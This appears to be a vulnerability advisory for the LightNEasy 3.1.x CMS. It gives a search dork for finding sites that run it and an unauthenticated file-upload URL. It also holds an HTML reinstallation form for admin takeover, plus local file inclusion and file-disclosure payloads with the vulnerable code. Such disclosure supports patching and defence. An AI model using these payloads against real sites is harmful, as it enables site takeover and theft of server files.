@@ -1,0 +1,66 @@
+##############################################################################
+#Title:             LightNEasy 3.1.x Multiple Vulnerabilites                 #
+#Vendor:            http://lightneasy.org/                                   #
+#Dork:              "Powered by LightNEasy"                                  #
+##############################################################################
+#AUTHOR:            ITSecTeam                                                #
+#Email:             Bug@ITSecTeam.com                                        #
+#Website:           http://www.itsecteam.com                                 #
+#Forum :            http://forum.ITSecTeam.com                               #
+#Original Advisory: www.ITSecTeam.com/en/vulnerabilities/vulnerability46.htm #
+#Thanks:            r3dm0v3 [r3dm0v3_at_ymail.com]                           #
+##############################################################################
+
+#DESCRIPTION (by vendor):#####################################################
+ LightNEasy, a simple and light Content Management System and Website Builder
+
+
+#1-fckeditor Remote File Upload###############################################
+ #Desc:
+ Remote users can upload file without authentication.
+
+ #POC:
+ http://site.com/fckeditor/editor/filemanager/connectors/test.html
+
+
+#2-Reinstallation#############################################################
+ #Desc:
+  After software installation it is still possible for remote users to reinstall
+  the software without authentication.
+
+ #Exploit:
+  <html>
+  <form name="form1" action="http://site.com/LightNEasy/install1.php" method="post"><table>
+  <tr><td>Enter password:</td><td><input type="password" name="password" value="" /></td></tr>
+  <tr><td>Repeat password:</td><td><input type="password" name="password1" value="" /></td></tr>
+  <tr><td>Admin name:</td><td><input type="text" name="admin" value="" /></td></tr>
+  <tr><td>Admin email:</td><td><input type="text" name="email" value="" /></td></tr>
+  <tr><td>Website email:</td><td><input type="text" name="wemail" value="" /></td></tr>
+  <tr><td>Tables prefix:</td><td><input type="text" name="prefix" value="LNE_" /></td></tr>
+  <tr><td>Database system:</td><td><select name="database" ><option value="SQLite2">SQLite 2 (following fields empty)</option><option value="SQLite3">SQLite 3 (following fields empty)</option><option value="MySQL">MySQL</option></select></td></tr>
+  <tr><td>Database name:</td><td><input type="text" name="databasename" value="" /></td></tr>
+  <tr><td>MySQL login:</td><td><input type="text" name="databaselogin" value="" /></td></tr>
+  <tr><td>MySQL password:</td><td><input type="text" name="databasepassword" value="" /></td></tr>
+  <tr><td>MySQL host:</td><td><input type="text" name="databasehost" value="" /></td></tr>
+  <tr><td> </td><td><input type="submit" name="submit" value="Create Database" /></td></tr>
+  </table></form>
+  </html>
+
+
+#3-Filemanager plugin Local File Inclusion####################################
+ #Bug-file: /plugins/filemanager/get_file.php
+   29:  if(!isset($language)) $language = 'en';
+   30:  include("languages/lang_$language.inc"); //<---- vulnerable line!
+
+ #Exploit:
+  http://site.com/plugins/filemanager/get_file.php?language=[file_to_include]%00
+
+
+#4-Filemanager plugin Local File Disclosure###################################
+ #Bug-File:
+   14:  if(isset($_REQUEST['file'])) $file = $_REQUEST['file'];
+   ...
+   56:  readfile($file);
+
+ #EXPLOIT:
+  http://site.com/plugins/filemanager/get_file.php?file=[file_to_read]
